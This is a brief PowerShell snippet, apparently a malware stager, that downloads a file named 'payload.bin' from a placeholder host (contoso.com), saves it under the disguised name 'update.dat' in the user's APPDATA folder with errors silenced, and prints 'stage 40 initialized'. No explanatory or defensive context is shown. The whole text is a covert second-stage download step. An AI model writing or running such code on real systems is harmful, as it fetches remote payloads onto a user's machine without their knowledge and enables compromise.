
$DownloadUrl = 'http://contoso.com/downloads/payload.bin'
$Stage2Path = "$env:APPDATA\update.dat"
Invoke-WebRequest -Uri $DownloadUrl -OutFile $Stage2Path -UseBasicParsing -ErrorAction SilentlyContinue
Write-Output "stage 40 initialized"
